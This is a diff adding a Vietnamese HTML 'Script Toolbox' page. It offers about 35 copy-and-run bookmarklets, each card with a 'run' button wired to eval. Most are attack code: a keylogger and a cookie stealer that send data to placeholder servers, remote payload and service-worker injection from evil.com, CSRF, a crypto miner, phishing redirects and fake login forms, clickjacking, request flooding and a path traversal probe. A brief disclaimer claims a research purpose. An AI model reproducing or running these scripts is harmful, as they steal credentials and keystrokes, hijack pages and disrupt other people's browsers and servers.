@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔧 Script Toolbox 50+</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0b0e14;
+            color: #c9d1d9;
+            padding: 20px;
+        }
+        h1 {
+            color: #58a6ff;
+            border-bottom: 2px solid #30363d;
+            padding-bottom: 10px;
+            margin-bottom: 25px;
+        }
+        .note {
+            background: #1e2a3a;
+            padding: 15px;
+            border-left: 5px solid #f0883e;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            font-size: 0.95rem;
+        }
+        .note code {
+            background: #0d1117;
+            padding: 3px 8px;
+            border-radius: 4px;
+            color: #f0883e;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 16px;
+        }
+        .card {
+            background: #161b22;
+            border-radius: 12px;
+            padding: 16px 18px 20px;
+            border: 1px solid #30363d;
+            transition: 0.2s;
+        }
+        .card:hover {
+            border-color: #58a6ff;
+            background: #1c2333;
+        }
+        .card h3 {
+            font-size: 1rem;
+            color: #f0f6fc;
+            margin-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+        }
+        .card .badge {
+            background: #238636;
+            font-size: 0.7rem;
+            padding: 2px 10px;
+            border-radius: 20px;
+            color: #fff;
+            font-weight: normal;
+        }
+        .card .badge.danger {
+            background: #da3633;
+        }
+        .card .badge.warn {
+            background: #d29922;
+        }
+        .card p {
+            font-size: 0.85rem;
+            color: #8b949e;
+            margin-bottom: 12px;
+            line-height: 1.4;
+        }
+        .card .script {
+            background: #0d1117;
+            padding: 8px 10px;
+            border-radius: 6px;
+            font-size: 0.7rem;
+            color: #f0883e;
+            overflow-x: auto;
+            white-space: nowrap;
+            margin-bottom: 12px;
+            border: 1px solid #30363d;
+            user-select: all;
+        }
+        .btn {
+            background: #21262d;
+            border: 1px solid #30363d;
+            color: #c9d1d9;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: inherit;
+        }
+        .btn:hover {
+            background: #30363d;
+            border-color: #58a6ff;
+            color: #fff;
+        }
+        .btn.copy {
+            background: #1f6feb;
+            border-color: #1f6feb;
+            color: #fff;
+        }
+        .btn.copy:hover {
+            background: #388bfd;
+        }
+        .btn.danger {
+            background: #da3633;
+            border-color: #da3633;
+            color: #fff;
+        }
+        .btn.danger:hover {
+            background: #f85149;
+        }
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            color: #484f58;
+            font-size: 0.8rem;
+            border-top: 1px solid #21262d;
+            padding-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<h1>⚡ Script Toolbox · 50+ tác vụ</h1>
+
+<div class="note">
+    <strong>📘 Hướng dẫn sử dụng:</strong><br>
+    • Mỗi thẻ là một <strong>bookmarklet</strong> – kéo thả vào thanh dấu trang hoặc copy & dán vào URL bookmark.<br>
+    • Bấm <strong>"Sao chép"</strong> để lấy mã, sau đó tạo bookmark mới và dán vào trường URL.<br>
+    • Bấm <strong>"Chạy thử"</strong> để thực thi ngay trên tab hiện tại (có thể gây ảnh hưởng đến trang đang mở).<br>
+    • <span style="color:#f0883e;">⚠️ Chỉ dùng trên môi trường thử nghiệm, không dùng tấn công người khác.</span>
+</div>
+
+<div class="grid" id="scriptGrid"></div>
+
+<div class="footer">
+    Tạo bởi Danno_ue · 50 script · Dùng cho mục đích nghiên cứu & giáo dục
+</div>
+
+<script>
+    const scripts = [
+        { id: 51, name: "Keylogger cơ bản", desc: "Ghi lại phím nhấn và gửi đến server logger.", code: "javascript:(function(){var k='';document.addEventListener('keydown',function(e){k+=e.key;if(k.length>100){navigator.sendBeacon('//your-logger.com',k);k='';}});alert('Keylogger started');})();", level: "danger" },
+        { id: 52, name: "Đánh cắp cookie", desc: "Lấy cookie hiện tại và gửi đến server.", code: "javascript:(function(){var c=document.cookie;navigator.sendBeacon('//your-server.com?c='+encodeURIComponent(c));})();", level: "danger" },
+        { id: 53, name: "Chèn iframe độc hại", desc: "Ghi đè trang bằng iframe chiếm toàn màn hình.", code: "javascript:document.write('<iframe src=\\'//evil.com/xss.html\\' style=\\'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;\\'></iframe>');", level: "danger" },
+        { id: 54, name: "Tải script từ remote", desc: "Chèn script từ evil.com vào trang.", code: "javascript:(function(){var s=document.createElement('script');s.src='//evil.com/payload.js';document.head.appendChild(s);})();", level: "danger" },
+        { id: 55, name: "Tự động click link", desc: "Mở tất cả link trong tab mới (DoS trình duyệt).", code: "javascript:document.querySelectorAll('a[href]').forEach(function(a){setTimeout(function(){window.open(a.href,'_blank');},Math.random()*5000);});", level: "warn" },
+        { id: 56, name: "Fake login form", desc: "Thay nội dung bằng form đăng nhập giả mạo.", code: "javascript:document.body.innerHTML='<h1>Đăng nhập lại</h1><form><input type=\\'text\\' placeholder=\\'Tài khoản\\'><input type=\\'password\\' placeholder=\\'Mật khẩu\\'><button onclick=\\'alert(\\'Đã gửi!\\')\\'>Đăng nhập</button></form>';", level: "warn" },
+        { id: 57, name: "Spam request GET", desc: "Gửi request GET liên tục mỗi 100ms.", code: "javascript:setInterval(function(){fetch(window.location.href);},100);", level: "warn" },
+        { id: 58, name: "Bẻ gãy WebSocket", desc: "Tạo kết nối WebSocket giả để gây xung đột.", code: "javascript:(function(){var ws=new WebSocket('wss://echo.websocket.org');ws.onopen=function(){ws.send('Attack');};})();", level: "warn" },
+        { id: 60, name: "Chuyển hướng phishing", desc: "Chuyển hướng đến trang phishing với redirect.", code: "javascript:window.location.href='//phishing.com/fake-login?redirect='+encodeURIComponent(window.location.href);", level: "danger" },
+        { id: 61, name: "Khóa click toàn trang", desc: "Chặn mọi sự kiện click, không thể bấm gì.", code: "javascript:document.addEventListener('click',function(e){e.stopPropagation();e.preventDefault();alert('Bị khóa!');},true);", level: "danger" },
+        { id: 64, name: "Backdoor Service Worker", desc: "Đăng ký SW từ remote để can thiệp request.", code: "javascript:navigator.serviceWorker.register('//evil.com/sw.js',{scope:'/'});", level: "danger" },
+        { id: 65, name: "CSRF tự động", desc: "Gửi POST đến API với cookie hiện tại.", code: "javascript:fetch('//target.com/api/delete',{method:'POST',body:'id=1',credentials:'include'});", level: "danger" },
+        { id: 67, name: "Miner Crypto", desc: "Chạy miner CoinHive trong nền (ngốn CPU).", code: "javascript:(function(){var s=document.createElement('script');s.src='//coinhive.com/lib/coinhive.min.js';document.head.appendChild(s);setTimeout(function(){var miner=new CoinHive.Anonymous('SITE_KEY');miner.start();},1000);})();", level: "danger" },
+        { id: 68, name: "Mở 100 tab", desc: "Mở 100 tab about:blank để treo trình duyệt.", code: "javascript:for(var i=0;i<100;i++){window.open('about:blank');}", level: "warn" },
+        { id: 69, name: "Ẩn console log", desc: "Ghi đè console.log/warn/error thành hàm rỗng.", code: "javascript:console.log=function(){};console.warn=function(){};console.error=function(){};", level: "warn" },
+        { id: 70, name: "DOM Clobbering", desc: "Ghi đè alert thành hàm phá hoại.", code: "javascript:window.alert=function(){document.write('<h1>Hacked</h1>');};", level: "danger" },
+        { id: 71, name: "Popup không đóng", desc: "Mở popup mới mỗi 500ms không thể tắt.", code: "javascript:setInterval(function(){window.open('about:blank','_blank','width=100,height=100');},500);", level: "warn" },
+        { id: 72, name: "Giả mạo URL", desc: "Thay đổi history thành URL giả.", code: "javascript:history.pushState({},'','//fake.com/');", level: "warn" },
+        { id: 73, name: "Dò /admin", desc: "Gửi request đến /admin để kiểm tra trạng thái.", code: "javascript:fetch('/admin').then(r=>alert(r.status));", level: "warn" },
+        { id: 75, name: "Spam submit form", desc: "Submit form 1000 lần liên tiếp.", code: "javascript:for(var i=0;i<1000;i++){document.querySelector('form').submit();}", level: "warn" },
+        { id: 78, name: "Gửi SMS giả", desc: "Gửi POST đến API Twilio mô phỏng.", code: "javascript:fetch('//api.twilio.com/...',{method:'POST',body:'To=+8412345678&From=+123456789&Body=Hacked'});", level: "danger" },
+        { id: 79, name: "Lấy CAPTCHA", desc: "Lấy URL ảnh CAPTCHA từ trang.", code: "javascript:alert('CAPTCHA: '+document.querySelector('img[src*=\"captcha\"]').src);", level: "warn" },
+        { id: 82, name: "Chặn fetch/XHR", desc: "Chặn mọi request mạng từ trang.", code: "javascript:window.fetch=function(){return Promise.reject('Blocked');};XMLHttpRequest.prototype.send=function(){};", level: "warn" },
+        { id: 85, name: "DNS rebinding giả", desc: "Chuyển hướng đến 127.0.0.1 cổng ngẫu nhiên.", code: "javascript:location.href='http://127.0.0.1:'+Math.floor(Math.random()*10000)+'/';", level: "warn" },
+        { id: 86, name: "50 iframe", desc: "Tạo 50 iframe tải google.com.", code: "javascript:for(var i=0;i<50;i++){document.body.appendChild(document.createElement('iframe')).src='//google.com';}", level: "warn" },
+        { id: 88, name: "Âm thanh vô tận", desc: "Phát âm thanh loop không dừng.", code: "javascript:(function(){var a=new Audio('//evil.com/scream.wav');a.loop=true;a.play();})();", level: "warn" },
+        { id: 90, name: "Console spam", desc: "In thông báo liên tục vào console.", code: "javascript:setInterval(function(){console.clear();console.log('Bạn không thể xóa tôi!');},100);", level: "warn" },
+        { id: 91, name: "Chặn DevTools", desc: "Chặn phím Ctrl+Shift+I mở DevTools.", code: "javascript:document.addEventListener('keydown',function(e){if(e.ctrlKey&&e.shiftKey&&e.key==='I'){e.preventDefault();}},true);", level: "warn" },
+        { id: 92, name: "Clickjacking", desc: "Thêm iframe trong suốt che phủ trang.", code: "javascript:document.body.innerHTML+='<iframe src=\"//evil.com\" style=\"position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.1;z-index:999;\"></iframe>';", level: "danger" },
+        { id: 95, name: "HTTP/2 Rapid Reset", desc: "Gửi 1000 fetch liên tục với header X-Attack.", code: "javascript:for(var i=0;i<1000;i++){fetch(window.location.href,{headers:{'X-Attack':'Reset'}});}", level: "warn" },
+        { id: 96, name: "Chặn sendBeacon", desc: "Vô hiệu hóa navigator.sendBeacon.", code: "javascript:navigator.sendBeacon=function(){return false;};", level: "warn" },
+        { id: 98, name: "Path traversal", desc: "Thử fetch /etc/passwd.", code: "javascript:fetch('/../../../../etc/passwd').then(r=>r.text()).then(alert);", level: "danger" },
+        { id: 99, name: "Upload file giả", desc: "Gửi file test.txt lên server.", code: "javascript:var f=new FormData();f.append('file',new Blob(['Hello World']),'test.txt');fetch('//evil.com/upload',{method:'POST',body:f});", level: "danger" },
+        { id: 100, name: "Phá hủy DOM", desc: "Xóa toàn bộ nội dung trang.", code: "javascript:document.documentElement.innerHTML='<h1>Bị tấn công</h1>';", level: "danger" }
+    ];
+
+    function render() {
+        const grid = document.getElementById('scriptGrid');
+        grid.innerHTML = '';
+        scripts.forEach(s => {
+            const card = document.createElement('div');
+            card.className = 'card';
+
+            const badgeMap = {
+                'danger': 'danger',
+                'warn': 'warn',
+                'info': 'info'
+            };
+            const badgeClass = badgeMap[s.level] || 'info';
+
+            card.innerHTML = `
+                <h3>
+                    <span>#${s.id} · ${s.name}</span>
+                    <span class="badge ${badgeClass}">${s.level}</span>
+                </h3>
+                <p>${s.desc}</p>
+                <div class="script">${s.code}</div>
+                <div style="display:flex;gap:8px;flex-wrap:wrap;">
+                    <button class="btn copy" data-code="${s.code.replace(/"/g, '&quot;')}">📋 Sao chép</button>
+                    <button class="btn danger" data-code="${s.code}">⚡ Chạy thử</button>
+                </div>
+            `;
+            grid.appendChild(card);
+        });
+
+        // Copy
+        document.querySelectorAll('.btn.copy').forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                const code = this.dataset.code;
+                navigator.clipboard.writeText(code).then(() => {
+                    alert('✅ Đã sao chép script #' + this.closest('.card').querySelector('h3 span').textContent.trim().split('·')[0].replace('#', ''));
+                }).catch(() => {
+                    prompt('Copy thủ công:', code);
+                });
+            });
+        });
+
+        // Run
+        document.querySelectorAll('.btn.danger').forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                const code = this.dataset.code;
+                if (confirm('⚠️ Bạn có chắc muốn chạy script này trên tab hiện tại?')) {
+                    try {
+                        eval(code.replace(/^javascript:/, ''));
+                    } catch (err) {
+                        alert('❌ Lỗi: ' + err.message);
+                    }
+                }
+            });
+        });
+    }
+
+    render();
+</script>
+</body>
+</html>
